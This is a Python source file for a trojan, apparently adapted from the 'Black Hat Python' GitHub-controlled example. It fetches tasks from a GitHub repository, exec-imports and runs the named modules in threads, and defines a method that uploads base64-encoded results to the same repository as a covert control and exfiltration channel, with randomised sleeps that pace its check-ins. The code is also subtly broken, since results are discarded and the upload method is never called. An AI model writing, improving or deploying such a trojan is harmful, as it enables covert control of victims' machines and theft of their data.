import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
    user = 'tiarno'
    sess = github3.login(token=token)
    return sess.repository('RandomMf35345', 'bhptrojan')  # Corrected repo access

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])  # Fixed the missing parenthesis
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remove_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(
            remove_path, message, base64.b64encode(bindata)
        )

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)  # Ensure proper argument passing
                )
                thread.start()
                time.sleep(random.randint(1, 10))  # Random sleep after starting a thread
            time.sleep(random.randint(30*60, 3*60*60))  # Random sleep between 30 minutes and 3 hours
